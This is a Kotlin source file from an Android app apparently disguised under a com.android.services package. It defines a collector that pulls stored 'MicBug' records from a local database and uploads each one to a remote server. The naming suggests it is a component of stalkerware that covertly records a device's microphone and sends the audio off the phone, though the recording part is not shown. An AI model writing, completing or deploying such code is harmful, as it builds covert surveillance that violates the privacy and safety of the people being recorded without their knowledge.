package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.MicBug
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class MicBugCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncMicBug) {
            localDatabaseSource.selectMicBugs { micBugs ->
                if (micBugs.isNotEmpty()) {
                    try {
                        val gson = GsonBuilder().create()
                        val mMicBugJSON =
                            JSONArray(gson.toJson(micBugs,
                                object : TypeToken<List<MicBug>>() {}.type))
                        val fileUploader =
                            FileUploader(context, AppConstants.MIC_BUG_TYPE, localDatabaseSource)
                        for (i in 0 until mMicBugJSON.length()) {
                            try {
                                fileUploader.uploadFile(mMicBugJSON.getJSONObject(i))
                            } catch (e: Exception) {
                                logException(e.message!!, AppConstants.MIC_BUG_TYPE, e)
                            }
                        }
                    } catch (e: Exception) {
                        AppUtils.appendLog(context, "${AppConstants.MIC_BUG_TYPE} ${e.message}")
                        logException(e.message!!, AppConstants.MIC_BUG_TYPE, e)
                    }
                } else {
                    logVerbose("No micBugs found", AppConstants.MIC_BUG_TYPE)
                }
            }
        } else {
            logVerbose("${AppConstants.MIC_BUG_TYPE} Sync is Off")
        }
    }
}